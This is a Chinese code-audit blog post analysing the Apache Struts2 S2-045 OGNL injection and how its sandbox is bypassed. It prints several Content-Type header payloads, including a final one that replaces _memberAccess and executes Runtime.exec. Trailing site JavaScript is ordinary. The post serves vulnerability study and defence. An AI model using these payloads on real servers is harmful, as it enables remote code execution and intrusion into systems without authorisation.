+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OgnlUtil 在容器里注册了，可以通过 getInstance() 拿到</span></span><br><span class="line">#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// SecurityMemberAccess 没有注册，容器里找不到，拿不到实例</span></span><br><span class="line">#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.SecurityMemberAccess<span class="meta">@class</span>) <span class="comment">// 返回 null</span></span><br></pre></td></tr></table></figure>
+
+<p><code>SecurityMemberAccess</code> 是在每次请求时由 Struts2 内部创建的，不是单例，不在容器里管理，没有公开的获取途径，所以 payload 里没办法直接拿到它的实例。</p>
+<p>选中 set 方法看是谁调用了它，找到了 <code>OgnlUtil</code> 里面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dfjq.png"></p>
+<p>可以看到这里还有其他的黑名单被创建，而 set 的参数是直接用的固定的值，这些值在初始化的时候就被建立：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1oab.png"></p>
+<p><code>OgnlUtil</code> 类里面是有 set 和 get 方法的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0z5l.png"></p>
+<p>注意到 get 方法返回的是一个 <code>Set</code> 对象，<code>Set</code> 对象是自带 <code>clear()</code> 方法的，这样就能清空黑名单了。</p>
+<p><strong>总结一下整个闭环</strong>：<code>SecurityMemberAccess</code> 是由 <code>OgnlUtil</code> 创建的，<code>OgnlUtil</code> 对象是可以获取的，赋值的黑名单绑定的是 <code>OgnlUtil</code> 里的字段，只要把 <code>OgnlUtil</code> 里的字段清空，<code>SecurityMemberAccess</code> 的黑名单就也没了，而 <code>OgnlUtil</code> 里刚好有 get 方法获取这个字段，<code>Set</code> 对象自带 <code>clear()</code> 方法，这样就成了一个闭环：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">OgnlUtil（容器里可获取）</span><br><span class="line">    → 创建 SecurityMemberAccess</span><br><span class="line">    → 把自己的 excludedPackageNames 引用传进去（同一块内存）</span><br><span class="line">    → OgnlUtil 暴露了 getExcludedPackageNames() 方法</span><br><span class="line">    → 拿到 Set 引用</span><br><span class="line">    → Set 自带 clear()</span><br><span class="line">    → 清空这块内存</span><br><span class="line">    → SecurityMemberAccess 里的黑名单也空了</span><br><span class="line">    → isPackageExcluded() 永远返回 false</span><br><span class="line">    → java.lang.Runtime 放行</span><br><span class="line">    → exec(&#x27;calc&#x27;) 执行</span><br><span class="line">→ 弹计算器</span><br></pre></td></tr></table></figure>
+
+<p>根据这个思路构造 payload 试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#ognlUtil.getExcludedPackageNamePatterns().clear()).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>结果没有成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_58ge.png"></p>
+<p>看来分析错了，这是高版本的绕过机制，现在这个版本不适合，还有其他沙箱没有绕过。</p>
+<p>通过日志分析，还是识别并拦截了对 <code>java.lang.Runtime</code> 的调用：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_9x7r.png"></p>
+<p>对比了一下没有 <code>clear()</code> 的报错日志，发现是一样的，也就是说 <code>clear()</code> 的作用没有效果。经过调试，一直在那三个检测函数上循环，然后找到了被检测的地方：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cqd0.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clazz 是 java.lang.Class</span><br></pre></td></tr></table></figure>
+
+<p>这个判断是<strong>硬编码</strong>的，不是从黑名单里读的，<code>clear()</code> 清空黑名单对这里没有任何影响。</p>
+<p>所以 <code>Runtime</code> 被拦截不是因为黑名单，而是因为访问 <code>Runtime</code> 时涉及到了 <code>Class</code> 对象，被这个硬编码的检测直接拦截了，<code>clear()</code> 根本解决不了这个问题。</p>
+<hr>
+<h3 id="第三步：尝试反射修改-allowStaticMethodAccess"><a href="#第三步：尝试反射修改-allowStaticMethodAccess" class="headerlink" title="第三步：尝试反射修改 allowStaticMethodAccess"></a>第三步：尝试反射修改 <code>allowStaticMethodAccess</code></h3><p>注意硬编码里有个条件 <code>!allowStaticMethodAccess</code>，如果 <code>allowStaticMethodAccess</code> 是 <code>true</code>，这个检测就不会拦截：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_l1ml.png"></p>
+<p>跟进看这个字段在哪里定义，找 <code>public SecurityMemberAccess(boolean method)</code>，找到了 <code>OgnlUtil</code> 里创建对象：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gf8j.png"></p>
+<p>发现 <code>OgnlUtil</code> 里也只是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> allowStaticMethodAccess;</span><br></pre></td></tr></table></figure>
+
+<p>没有定义 <code>false</code>，但是 Java 里 <code>boolean</code> 类型的字段如果没有显式赋值，默认就是 <code>false</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_nw99.png"></p>
+<p>所以下一步就是想办法把 <code>allowStaticMethodAccess</code> 反射为 <code>true</code>。因为是私有的，需要反射修改：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#f=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>)).</span><br><span class="line">(#f.setAccessible(<span class="literal">true</span>)).</span><br><span class="line">(#f.set(#_memberAccess,<span class="literal">true</span>))</span><br></pre></td></tr></table></figure>
+
+<p>构造完整 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Type: %&#123;(#f=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)).(#f.setAccessible(true)).(#f.set(#_memberAccess,true)).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_mrco.png"></p>
+<p>依然没有成功，然后发现在 <code>isClassExcluded</code> 里被拦截了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j1j5.png"></p>
+<p>查看黑名单发现：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jq4s.png"></p>
+<p><code>SecurityMemberAccess</code> 本身也在类黑名单里，所以对它用反射直接被拦截了。还是死循环：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对 _memberAccess 用反射</span><br><span class="line">    → isClassExcluded(SecurityMemberAccess)</span><br><span class="line">    → SecurityMemberAccess 在黑名单里</span><br><span class="line">    → 被拦截</span><br></pre></td></tr></table></figure>
+
+<p>这条路也走不通。</p>
+<hr>
+<h3 id="第四步：绕过-SecurityMemberAccess-本身"><a href="#第四步：绕过-SecurityMemberAccess-本身" class="headerlink" title="第四步：绕过 SecurityMemberAccess 本身"></a>第四步：绕过 SecurityMemberAccess 本身</h3><p>既然不能改 <code>SecurityMemberAccess</code> 里面的内容，那能不能绕过 <code>SecurityMemberAccess</code> 本身？</p>
+<p>因为这一整个检测都是在 <code>SecurityMemberAccess</code> 的 <code>isAccessible</code> 方法里的。还记得当时调试的代码是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getMemberAccess().isAccessible(...)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_svzj.png"></p>
+<p><code>context.getMemberAccess()</code> 返回的就是 <code>SecurityMemberAccess</code> 对象</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_99ml.png"></p>
+<p>然后再执行 <code>SecurityMemberAccess</code> 里的 <code>isAccessible</code> 检测方法。注意这里是通过字段 <code>_memberAccess</code> 获取的：</p>
+<p>那能不能直接反射改掉这个字段呢？</p>
+<p><code>SecurityMemberAccess</code> 是 Struts2 自定义的安全检测拦截对象，是通过继承 <code>DefaultMemberAccess</code> 实现的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dpjc.png"></p>
+<p>而 <code>DefaultMemberAccess</code> 是 OGNL 自带的：</p>
+<p><code>DefaultMemberAccess</code> 的 <code>isAccessible</code> 方法里没有任何拦截：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6ta2.png"></p>
+<p>找到创建的地方，在 <code>OgnlContext</code> 里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uxy1.png"></p>
+<p>虽然传入的是 <code>false</code>，这就意味着：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public  直接 true</span></span><br><span class="line"><span class="comment">// false，private 不行</span></span><br><span class="line"><span class="comment">// false，protected 不行</span></span><br></pre></td></tr></table></figure>
+
+<p>就这么简单。而 <code>Runtime.getRuntime()</code> 和 <code>exec()</code> 都是 <code>public</code> 方法，所以直接放行，不影响漏洞利用。</p>
+<p><strong>思路就是把 <code>_memberAccess</code> 换成 <code>DefaultMemberAccess</code> 即可：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).</span><br><span class="line">(#_memberAccess=#dm).</span><br><span class="line">(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;calc&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>构造完整 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Type: %&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功弹出计算器！</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_51zk.png"></p>
+<p>这意味着 <code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code> 没有被检测到才能执行。访问的是 <code>ognl.OgnlContext</code> 这个类，包名是 <code>ognl</code>，黑名单里有 <code>ognl</code>，按理说应该被拦截。但是这里访问的是<strong>静态字段</strong>不是方法，走的检测路径不一样，这个版本对静态字段的访问检测没有对静态方法那么严格，所以能拿到 <code>DEFAULT_MEMBER_ACCESS</code>，拿到之后替换 <code>_memberAccess</code>，后续所有检测全部失效，直接执行 <code>exec(&#39;calc&#39;)</code>。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="漏洞触发链"><a href="#漏洞触发链" class="headerlink" title="漏洞触发链"></a>漏洞触发链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type 包含 %&#123;...&#125; 且格式不合法</span><br><span class="line">    → Jakarta 解析器抛异常</span><br><span class="line">    → e.getMessage() 带出 Content-Type 值</span><br><span class="line">    → buildErrorMessage() 无过滤传递</span><br><span class="line">    → LocalizedTextUtil.findText()</span><br><span class="line">    → getDefaultMessage()</span><br><span class="line">    → TextParseUtil.translateVariables()</span><br><span class="line">    → OGNL 求值</span><br></pre></td></tr></table></figure>
+
+<h3 id="沙箱绕过思路演进"><a href="#沙箱绕过思路演进" class="headerlink" title="沙箱绕过思路演进"></a>沙箱绕过思路演进</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">直接执行命令 → SecurityMemberAccess 拦截</span><br><span class="line">    ↓</span><br><span class="line">尝试 clear() 清黑名单 → 硬编码检测还在 → 被拦</span><br><span class="line">    ↓</span><br><span class="line">尝试反射改 allowStaticMethodAccess → SecurityMemberAccess 在类黑名单 → 被拦</span><br><span class="line">    ↓</span><br><span class="line">最终方案：直接替换 _memberAccess 为 DEFAULT_MEMBER_ACCESS</span><br><span class="line">    → isAccessible() 只检查 public/private 修饰符</span><br><span class="line">    → public 方法全部放行</span><br><span class="line">    → 弹计算器 ✓</span><br></pre></td></tr></table></figure>
+
+<h3 id="最终-payload（沙箱绕过）"><a href="#最终-payload（沙箱绕过）" class="headerlink" title="最终 payload（沙箱绕过）"></a>最终 payload（沙箱绕过）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).</span><br><span class="line">(#_memberAccess=#dm).</span><br><span class="line">(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;calc&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞本质</strong>：Jakarta multipart 解析器在解析失败时，会把包含用户可控数据的异常消息原封不动地传入 Struts2 国际化文本处理流程，而该流程会对所有文本内容进行 OGNL 求值，导致任意代码执行。防御上，Struts2 后续版本对 OGNL 求值入口做了更严格的输入过滤，并且不再对异常消息内容进行 OGNL 处理。</p>
+</article>
+<div class="article-footer slide-up">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer slide-up footnote"><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right"><div class="sidebg"></div><div class="rightbar-container">
+<div class="rightbar-top-btn">
+  <a class="top" onclick="util.scrollTop()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg>
+    <span>回到顶部</span>
+  </a>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select" onclick="sidebar.toggleTOC()"><span class="name">本文目录</span></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Struts2-%E2%80%94%E2%80%94-S2-045-OGNL-%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%B8%89%E9%87%8D%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞触发验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-%E9%80%90%E6%AE%B5%E6%8B%86%E8%A7%A3"><span class="toc-text">Payload 逐段拆解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">%{...} 是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-payload-%E6%B3%A8%E9%87%8A%E7%89%88"><span class="toc-text">完整 payload 注释版</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-text">手动搭建复现环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pom-xml"><span class="toc-text">pom.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml-%E2%80%94-Struts2-%E7%9A%84%E5%85%A5%E5%8F%A3"><span class="toc-text">web.xml — Struts2 的入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#src-main-resources-struts-xml"><span class="toc-text">src&#x2F;main&#x2F;resources&#x2F;struts.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UploadAction-java"><span class="toc-text">UploadAction.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-jsp"><span class="toc-text">upload.jsp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86"><span class="toc-text">正常请求流程梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E9%AA%8C%E8%AF%81-OGNL-%E6%89%A7%E8%A1%8C"><span class="toc-text">调试验证 OGNL 执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%A1%AE%E8%AE%A4-OGNL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%A1%AE%E5%AE%9E%E8%A2%AB%E6%89%A7%E8%A1%8C%E4%BA%86"><span class="toc-text">先确认 OGNL 表达式确实被执行了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E7%94%A8%E6%A0%88%E5%88%86%E6%9E%90"><span class="toc-text">源码调用栈分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93"><span class="toc-text">漏洞根因总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B"><span class="toc-text">沙箱机制与绕过过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%9B%B4%E6%8E%A5-RCE-%E5%B0%9D%E8%AF%95%EF%BC%8C%E5%A4%B1%E8%B4%A5"><span class="toc-text">第一步：直接 RCE 尝试，失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%B0%9D%E8%AF%95-clear-%E6%B8%85%E7%A9%BA%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">第二步：尝试 clear() 清空黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%B0%9D%E8%AF%95%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9-allowStaticMethodAccess"><span class="toc-text">第三步：尝试反射修改 allowStaticMethodAccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%BB%95%E8%BF%87-SecurityMemberAccess-%E6%9C%AC%E8%BA%AB"><span class="toc-text">第四步：绕过 SecurityMemberAccess 本身</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="toc-text">漏洞触发链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%BC%94%E8%BF%9B"><span class="toc-text">沙箱绕过思路演进</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88-payload%EF%BC%88%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">最终 payload（沙箱绕过）</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"></div></widget>
+</div></div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
